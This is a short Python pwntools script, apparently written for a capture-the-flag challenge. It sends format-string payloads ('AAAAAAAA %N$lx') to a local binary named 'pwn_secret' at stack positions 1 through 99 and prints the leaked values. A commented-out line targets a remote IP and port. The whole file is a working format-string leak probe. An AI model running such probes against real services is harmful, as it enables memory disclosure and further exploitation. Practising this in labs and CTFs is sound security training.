from pwn import *

context.log_level = 'critical'
BINARY = './pwn_secret'

for i in range(1, 100):
    p = process(BINARY)
    #p = remote('34.107.12.125', 31825)
    p.sendlineafter(': ', 'AAAAAAAA %{}$lx'.format(i))
    print('%02d: ' % i + p.recvline()[:-1])
    p.close()

print()

